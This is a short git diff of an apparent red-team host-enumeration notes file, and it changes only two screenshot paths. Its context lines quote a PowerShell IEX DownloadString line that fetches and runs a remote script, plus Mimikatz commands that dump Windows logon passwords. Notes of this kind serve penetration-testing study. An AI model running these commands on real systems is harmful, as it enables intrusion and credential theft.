@@ -54,7 +54,7 @@ C:\Users\Hassan.saad\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Start
 
 ### DLL Proxying
 
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Screen2.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Images/Screen2.png?raw=true)
 
 Create legitimate.cpp file.
 
@@ -151,7 +151,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercont
 Invoke-Mimikatz -Command 'privilege::debug'
 Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'
 ```
-![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Screen1.png?raw=true)
+![alt text](https://raw.githubusercontent.com/hassan0x/RedTeam/main/HostEnumeration/Images/Screen1.png?raw=true)
 
 ### Windows Credentials Manager
 ```
